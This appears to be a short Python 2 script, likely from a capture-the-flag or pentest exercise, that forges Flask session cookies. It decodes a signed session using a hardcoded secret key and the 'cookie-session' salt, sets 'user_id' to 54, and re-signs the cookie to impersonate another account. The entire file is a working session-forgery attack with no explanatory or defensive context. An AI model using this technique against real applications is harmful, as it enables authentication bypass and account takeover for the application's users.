from itsdangerous import URLSafeTimedSerializer
# from itsdangerous import URLSafeSerializer
from flask.sessions import TaggedJSONSerializer
import hashlib

val = 'xxxxxxx'
secret_key = '30cbf7006ff9489c4e7b89075ece3913'
salt = 'cookie-session'
serializer = TaggedJSONSerializer()
signer_kwargs = dict(
    key_derivation='hmac',
    digest_method=hashlib.sha1
)
s = URLSafeTimedSerializer(secret_key,salt=salt,serializer=serializer,signer_kwargs=signer_kwargs)
print s.loads(val)

new = s.loads(val)
new['user_id']=54
print s.dumps(new)


